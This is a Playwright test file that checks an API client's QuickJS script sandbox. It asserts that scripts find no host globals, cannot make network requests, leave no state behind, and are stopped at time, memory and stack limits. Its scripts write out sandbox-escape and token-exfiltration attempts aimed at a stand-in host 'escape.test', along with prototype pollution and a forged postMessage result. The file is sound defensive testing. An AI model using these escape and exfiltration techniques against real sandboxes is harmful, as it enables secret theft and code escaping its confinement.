import { test, expect, type Page } from "@playwright/test";
import { TARGET, captureTarget, expectProdParity, seedAndOpen, send } from "./support/app";

// P3.7: escape attempts against the script sandbox, from inside a script,
// under production headers in three engines. A script runs in QuickJS
// (WebAssembly); these tests are what "it reaches nothing but the API it is
// given" means. Run with CI=1 (the production build).
//
// Each attempt is a `pm.test` inside the script: it passes when the attempt
// got nothing. The page then requires every row to have passed, and looks
// at the network and at the page itself from the outside.

// Routed hosts must not be shadowed by the app's service worker.
test.use({ serviceWorkers: "block" });

/** A host no script may reach. Routed, so an attempt that got out would be counted, not lost in a DNS error. */
const CANARY = "https://escape.test";

/** What ECMAScript puts on a global object, as QuickJS has it, and the six names the host adds. Anything else got in. */
const BUILT_INS =
  "AggregateError Array ArrayBuffer BigInt BigInt64Array BigUint64Array Boolean DataView Date Error EvalError FinalizationRegistry Float16Array Float32Array Float64Array Function Infinity Int16Array Int32Array Int8Array InternalError Iterator JSON Map Math NaN Number Object Promise Proxy RangeError ReferenceError Reflect RegExp Set SharedArrayBuffer String Symbol SyntaxError TypeError URIError Uint16Array Uint32Array Uint8Array Uint8ClampedArray WeakMap WeakRef WeakSet decodeURI decodeURIComponent encodeURI encodeURIComponent escape eval globalThis isFinite isNaN parseFloat parseInt undefined unescape";
const ALLOWED = "pm console atob btoa setTimeout require";

/** Names a browser, a worker or Node would offer. None may exist inside the sandbox by any road. */
const HOST_NAMES = [
  "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "WebTransport", "RTCPeerConnection", "importScripts", "postMessage", "self", "window", "document",
  "navigator", "location", "Worker", "SharedWorker", "BroadcastChannel", "MessageChannel", "indexedDB", "caches", "localStorage", "sessionStorage", "cookieStore",
  "WebAssembly", "crypto", "performance", "queueMicrotask", "setInterval", "structuredClone", "EventTarget", "process", "module", "host", "close", "name", "onmessage",
];

interface Watch {
  /** Requests to the canary host. */
  canary: string[];
  /** Every request the browser made that did not go to the app's own origin. */
  foreign: () => string[];
  violations: () => Promise<string[]>;
  errors: string[];
}

async function watch(page: Page, baseURL: string | undefined): Promise<Watch> {
  const canary: string[] = [];
  const all: string[] = [];
  const errors: string[] = [];
  // The context sees what a worker requests too, not only the page.
  page.context().on("request", (request) => all.push(request.url()));
  page.on("pageerror", (error) => errors.push(error.message));
  await page.context().route(`${CANARY}/**`, async (route) => {
    canary.push(route.request().url());
    await route.fulfill({ status: 200, headers: { "access-control-allow-origin": "*", "content-type": "text/javascript" }, body: "globalThis.escaped = true;" });
  });
  await page.addInitScript(() => {
    const seen: string[] = [];
    (window as unknown as { __violations: string[] }).__violations = seen;
    document.addEventListener("securitypolicyviolation", (e) => seen.push(`${e.effectiveDirective} ${e.blockedURI} ${e.sample}`));
  });
  return {
    canary,
    errors,
    foreign: () => all.filter((url) => !url.startsWith(`${baseURL}/`) && !url.startsWith("data:") && !url.startsWith("blob:")),
    violations: () => page.evaluate(() => (window as unknown as { __violations: string[] }).__violations),
  };
}

/** Sends the open request and returns the Tests tab's rows once the response is there. */
async function rows(page: Page): Promise<{ passed: string[]; failed: string[] }> {
  await send(page);
  await expect(page.locator(".status-badge")).toHaveText("200");
  await page.locator("app-response-viewer").getByRole("tab", { name: /Tests/ }).click();
  await expect(page.locator(".test-result-pass, .test-result-fail").first()).toBeVisible();
  return {
    passed: await page.locator(".test-result-pass .type-callout").allInnerTexts(),
    failed: await page.locator(".test-result-fail").allInnerTexts(),
  };
}

test("@claim:C-052 a script finds no host capability: no network, no worker scope, no storage, by any road to the global object", async ({ page, baseURL }) => {
  const seen = await watch(page, baseURL);
  await captureTarget(page);
  const response = await seedAndOpen(page, {}, {
    method: "GET",
    url: `${TARGET}/escape-globals`,
    postRequestScript: `
      const names = ${JSON.stringify(HOST_NAMES)};
      const roads = {
        "typeof": (name) => Function("return typeof " + name)(),
        "indirect eval": (name) => (0, eval)("typeof " + name),
        "globalThis": (name) => typeof globalThis[name],
        "Function('return this')()": (name) => typeof Function("return this")()[name],
        "a constructor's constructor": (name) => typeof ({}).constructor.constructor("return this")()[name],
        "a host function's constructor": (name) => typeof pm.environment.get.constructor("return this")()[name],
        "an async function's constructor": (name) => typeof (async function () {}).constructor("return globalThis")().constructor === "function" ? typeof globalThis[name] : "?",
        "a generator's constructor": (name) => typeof (function* () {}).constructor("return typeof " + name)().next().value === "string" ? (function* () {}).constructor("return typeof " + name)().next().value : "?",
      };
      for (const [road, look] of Object.entries(roads)) {
        pm.test("nothing of the host by " + road, () => {
          const found = names.filter((name) => look(name) !== "undefined");
          if (found.length) throw new Error("found: " + found.join(", "));
        });
      }
      pm.test("the global object is the engine's own, by every road", () => {
        const global = Function("return this")();
        if (global !== globalThis) throw new Error("Function('return this')() is another object");
        if ((0, eval)("this") !== globalThis) throw new Error("indirect eval sees another object");
        if (globalThis.constructor !== Object) throw new Error("globalThis.constructor is not the engine's Object");
        if (globalThis.constructor.constructor !== Function) throw new Error("its constructor is not the engine's Function");
        if (pm.test.constructor !== Function) throw new Error("a host function was made by another Function");
        if (Object.getPrototypeOf(pm.environment.get) !== Function.prototype) throw new Error("a host function has a foreign prototype");
      });
      pm.test("the global object holds the language's names and the allow-list, nothing more", () => {
        const expected = ${JSON.stringify(`${BUILT_INS} ${ALLOWED}`.split(" ").sort())};
        const names = Object.getOwnPropertyNames(globalThis).sort();
        const extra = names.filter((name) => !expected.includes(name));
        const missing = expected.filter((name) => !names.includes(name));
        if (extra.length || missing.length) throw new Error("extra: " + extra.join(", ") + "; missing: " + missing.join(", "));
        // The one symbol QuickJS puts there itself: the tag that names the object "global".
        const symbols = Object.getOwnPropertySymbols(globalThis).map(String).join(", ");
        if (symbols !== "Symbol(Symbol.toStringTag)") throw new Error("symbol-keyed properties on the global: " + symbols);
      });
      pm.test("pm and console hold only what is documented", () => {
        const shape = JSON.stringify([Object.keys(pm).sort(), Object.keys(pm.environment).sort(), Object.keys(console).sort()]);
        const expected = JSON.stringify([["environment", "expect", "response", "test"], ["get", "set", "unset"], ["error", "info", "log", "warn"]]);
        if (shape !== expected) throw new Error(shape);
      });
      pm.test("an error's stack names no file of the app", () => {
        const stack = String(new Error("x").stack);
        if (/https?:|worker|chunk|\\.js:\\d+:\\d+\\)?\\s*$/m.test(stack.replace(/script\\.js|wayfarer\\.js/g, ""))) throw new Error(stack);
      });
    `,
  });
  await expectProdParity(response);
  const result = await rows(page);
  expect(result.failed).toEqual([]);
  expect(result.passed).toHaveLength(12);
  expect(await seen.violations()).toEqual([]);
  expect(seen.errors).toEqual([]);
});

test("@claim:C-052 running a script makes no request: every network road is tried and nothing leaves", async ({ page, baseURL }) => {
  const seen = await watch(page, baseURL);
  const hits = await captureTarget(page);
  await seedAndOpen(page, { token: "a-value-worth-stealing" }, {
    method: "GET",
    url: `${TARGET}/escape-network`,
    preRequestScript: `
      const stolen = encodeURIComponent(pm.environment.get("token"));
      const attempts = {
        fetch: () => fetch("${CANARY}/fetch?" + stolen),
        XMLHttpRequest: () => { const x = new XMLHttpRequest(); x.open("GET", "${CANARY}/xhr?" + stolen); x.send(); },
        WebSocket: () => new WebSocket("wss://escape.test/ws?" + stolen),
        EventSource: () => new EventSource("${CANARY}/sse?" + stolen),
        sendBeacon: () => navigator.sendBeacon("${CANARY}/beacon", stolen),
        importScripts: () => importScripts("${CANARY}/import-scripts.js?" + stolen),
        Image: () => { new Image().src = "${CANARY}/image?" + stolen; },
        Worker: () => new Worker("${CANARY}/worker.js?" + stolen),
        "require of a module of Node": () => require("https").get("${CANARY}/require?" + stolen),
        "a string given to setTimeout": () => { setTimeout("fetch('${CANARY}/timer-string')", 0); },
      };
      for (const [name, attempt] of Object.entries(attempts)) {
        pm.test(name + " is not there to call", () => {
          let error;
          try { attempt(); } catch (thrown) { error = thrown; }
          // \`require\` exists since P3.5 and gives five libraries: for anything else it throws its own named error.
          const refused = name.startsWith("require") ? error && error.name === "WayfarerUnsupportedError" : error instanceof ReferenceError || error instanceof TypeError;
          if (!refused) throw new Error("it did not throw: " + error);
        });
      }
      pm.test("a library has no more than a script: nothing of the host by any of them", () => {
        const names = ${JSON.stringify(HOST_NAMES)};
        for (const library of ["chai", "crypto-js", "lodash", "moment", "uuid"]) require(library);
        const found = names.filter((name) => Function("return typeof " + name)() !== "undefined" || typeof require("lodash").get(globalThis, name) !== "undefined");
        if (found.length) throw new Error("found: " + found.join(", "));
        if (typeof require("lodash").template("<%= typeof fetch %>")() !== "string" || require("lodash").template("<%= typeof fetch %>")() !== "undefined") throw new Error("a template reached fetch");
      });
      let imported = "pending";
      import("${CANARY}/dynamic-import.js?" + stolen).then(() => { imported = "loaded"; }, (error) => { imported = "refused: " + error.name; });
      import("data:text/javascript,globalThis.escaped=true").then(() => { imported += ", data loaded"; }, () => { imported += ", data refused"; });
      setTimeout(() => {
        pm.test("dynamic import loads nothing", () => {
          if (imported !== "refused: ReferenceError, data refused") throw new Error(imported);
          if (typeof escaped !== "undefined") throw new Error("imported code ran");
        });
      }, 50);
    `,
    postRequestScript: `
      pm.test("a forged result cannot be posted", () => {
        let error;
        try { postMessage({ id: "forged", type: "result", result: { logs: [], envMutations: { token: "forged" }, testResults: [{ label: "forged row", passed: true, source: "script" }] } }); } catch (thrown) { error = thrown; }
        if (!(error instanceof ReferenceError)) throw new Error("postMessage exists");
        if (typeof self !== "undefined" || typeof globalThis.onmessage !== "undefined") throw new Error("a worker scope is in reach");
      });
    `,
  });
  const result = await rows(page);
  expect(result.failed).toEqual([]);
  // Ten attempts, the libraries, the dynamic import, and the forged result.
  expect(result.passed).toHaveLength(13);
  expect(result.passed).not.toContain("forged row");

  // From the outside: the canary host saw nothing, and the only request that left the app's origin is the user's own.
  expect(seen.canary).toEqual([]);
  expect(seen.foreign()).toEqual([`${TARGET}/escape-network`]);
  expect(hits).toHaveLength(1);
  expect(await seen.violations()).toEqual([]);
  expect(seen.errors).toEqual([]);
  // Nothing the script did reached the page either.
  expect(await page.evaluate(() => (globalThis as { escaped?: unknown }).escaped)).toBeUndefined();
});

test("@claim:C-052 a script leaves nothing behind: the next run has a new global, and the page's own objects are untouched", async ({ page, baseURL }) => {
  const seen = await watch(page, baseURL);
  await captureTarget(page);
  await seedAndOpen(page, {}, {
    method: "GET",
    url: `${TARGET}/escape-state`,
    postRequestScript: `
      pm.test("nothing is left of an earlier run", () => {
        if (({}).polluted !== undefined) throw new Error("Object.prototype was changed by an earlier run");
        if (typeof leaked !== "undefined") throw new Error("a global of an earlier run is here");
        if (JSON.stringify({ a: 1 }) !== '{"a":1}') throw new Error("JSON was replaced by an earlier run");
      });
      Object.prototype.polluted = "by the script";
      Array.prototype.map = function () { return ["hijacked"]; };
      globalThis.leaked = true;
      JSON.stringify = () => "hijacked";
      String = () => "hijacked";
      console.log("after the changes");
    `,
  });
  for (let run = 0; run < 3; run++) {
    const result = await rows(page);
    expect(result.failed).toEqual([]);
    expect(result.passed).toEqual(["nothing is left of an earlier run"]);
  }
  // The script's changes to Object.prototype and JSON were to the engine's objects, not the browser's.
  expect(await page.evaluate(() => [({} as { polluted?: unknown }).polluted, JSON.stringify({ a: 1 }), [1].map((n) => n + 1)])).toEqual([null, '{"a":1}', [2]].map((v) => (v === null ? undefined : v)));
  expect(await seen.violations()).toEqual([]);
  expect(seen.errors).toEqual([]);
});

// P3.6: the limits. Each test's pre-request script runs into one limit; the
// post-response script of the same send must then run normally, in a new
// worker. The tests assert what the page says, never how long it took: a CI
// runner may need several times a laptop's time for the same script (R6).
test.describe("limits", () => {
  const LIMITS: [name: string, script: string, message: string][] = [
    ["a script that never ends is stopped at the deadline", "pm.test('before the loop', () => {}); try { while (true) {} } catch (error) { console.log('caught'); }", "Script timed out after 5000 ms"],
    ["a script that allocates 200 MB is stopped at the memory limit", "const held = []; for (let i = 0; i < 25; i++) held.push(new Uint8Array(8 * 2 ** 20));", "Script exceeded memory limit (64 MB)"],
    ["a recursion 100,000 deep is stopped at the stack limit", "function down(n) { return n ? down(n - 1) + 1 : 0; } down(100000);", "Script exceeded the stack limit (too much recursion)"],
  ];

  for (const [name, script, message] of LIMITS) {
    test(`@claim:C-052 ${name}, and the next script runs`, async ({ page, baseURL }) => {
      // The deadline alone is 5 s of the script's own time.
      test.setTimeout(120_000);
      const seen = await watch(page, baseURL);
      const engines: string[] = [];
      page.context().on("request", (request) => {
        if (/\.wasm(\?|$)/.test(request.url())) engines.push(request.url());
      });
      const hits = await captureTarget(page);
      await seedAndOpen(page, {}, {
        method: "GET",
        url: `${TARGET}/limit`,
        preRequestScript: script,
        postRequestScript: "pm.test('the next script ran', () => pm.expect(pm.response).to.have.status(200));",
      });

      for (let run = 0; run < 2; run++) {
        await send(page);
        await expect(page.locator(".status-badge")).toHaveText("200", { timeout: 90_000 });
        await page.locator("app-response-viewer").getByRole("tab", { name: /Tests/ }).click();
        const stopped = page.locator(".test-result-fail", { hasText: "Pre-request script" });
        await expect(stopped).toContainText(message);
        // The script could not catch its way past the limit.
        await expect(page.locator(".script-console")).toHaveCount(0);
        // Straight after it, in the same send: a script in a new engine.
        await expect(page.locator(".test-result-pass", { hasText: "the next script ran" })).toBeVisible();
        await expect(page.locator(".test-result-fail")).toHaveCount(1);
      }

      // The worker was ended after each limit: the engine was loaded once per script run that followed one.
      expect(engines.length).toBeGreaterThanOrEqual(3);
      // The request itself went out both times, and nothing else did.
      expect(hits).toHaveLength(2);
      expect(seen.canary).toEqual([]);
      expect(await seen.violations()).toEqual([]);
      expect(seen.errors).toEqual([]);
    });
  }
});
